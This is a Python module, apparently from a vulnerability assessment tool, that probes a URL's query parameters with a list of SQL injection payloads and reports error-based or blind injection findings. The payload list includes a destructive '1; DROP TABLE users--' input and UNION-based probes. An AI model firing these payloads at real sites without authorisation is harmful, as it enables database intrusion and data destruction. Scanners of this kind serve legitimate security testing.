import requests
import urllib.parse
import time

# Common SQL injection payloads
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1; DROP TABLE users--",
    "' AND 1=2 UNION SELECT 1,2,3--",
]

# Error patterns that indicate SQL vulnerability
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "sqlite_error",
    "pg::syntaxerror",
    "invalid query",
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "postgresql error",
    "syntax error",
    "unexpected end of sql command",
]

def scan_sql_injection(url: str) -> dict:
    """
    Test a URL for SQL injection vulnerabilities by injecting payloads
    into query parameters and checking responses for error patterns.
    """
    findings = []
    tested_params = []
    total_tests = 0
    start_time = time.time()

    # Parse the URL and extract parameters
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    # If no query params exist, try adding a test param
    if not params:
        test_url = url + ("?" if "?" not in url else "&") + "id=1"
        params = {"id": ["1"]}
        base_url = test_url.split("?")[0]
    else:
        base_url = parsed.scheme + "://" + parsed.netloc + parsed.path

    headers = {
        "User-Agent": "Mozilla/5.0 (VAPT-Scanner/1.0) Security Assessment Tool"
    }

    # Get baseline response
    try:
        baseline_resp = requests.get(url, headers=headers, timeout=8, verify=False)
        baseline_length = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code
    except requests.RequestException as e:
        return {
            "module": "SQL Injection Scanner",
            "status": "error",
            "error": str(e),
            "findings": [],
            "risk_level": "unknown",
            "tested_params": [],
            "total_tests": 0,
            "duration": 0,
        }

    for param_name in params:
        tested_params.append(param_name)
        original_value = params[param_name][0]

        for payload in SQL_PAYLOADS:
            total_tests += 1
            test_params = dict(params)
            test_params[param_name] = [original_value + payload]
            query_string = urllib.parse.urlencode(test_params, doseq=True)
            test_url = base_url + "?" + query_string

            try:
                resp = requests.get(test_url, headers=headers, timeout=8, verify=False)
                response_text = resp.text.lower()

                # Check for SQL error patterns
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern in response_text:
                        findings.append({
                            "type": "Error-Based SQL Injection",
                            "severity": "HIGH",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": pattern,
                            "url": test_url,
                            "description": f"SQL error pattern '{pattern}' detected in response.",
                        })
                        break

                # Check for significant response length difference (blind SQLi indicator)
                length_diff = abs(len(resp.text) - baseline_length)
                if length_diff > 500 and resp.status_code != baseline_status:
                    findings.append({
                        "type": "Potential Blind SQL Injection",
                        "severity": "MEDIUM",
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": f"Response size changed by {length_diff} bytes and status changed.",
                        "url": test_url,
                        "description": "Significant response variation may indicate blind SQL injection.",
                    })

            except requests.RequestException:
                continue

    duration = round(time.time() - start_time, 2)

    # Deduplicate findings by parameter + type
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f["parameter"], f["type"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    # Sort findings: HIGH first, then MEDIUM, then LOW
    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
    unique_findings.sort(key=lambda x: sev_order.get(x.get("severity", "INFO"), 4))

    risk_level = "NONE"
    if unique_findings:
        severities = [f["severity"] for f in unique_findings]
        if "HIGH" in severities:
            risk_level = "HIGH"
        elif "MEDIUM" in severities:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"

    return {
        "module": "SQL Injection Scanner",
        "status": "completed",
        "target": url,
        "findings": unique_findings,
        "risk_level": risk_level,
        "tested_params": tested_params,
        "total_tests": total_tests,
        "duration": duration,
        "summary": f"{len(unique_findings)} vulnerabilities found across {len(tested_params)} parameter(s).",
    }
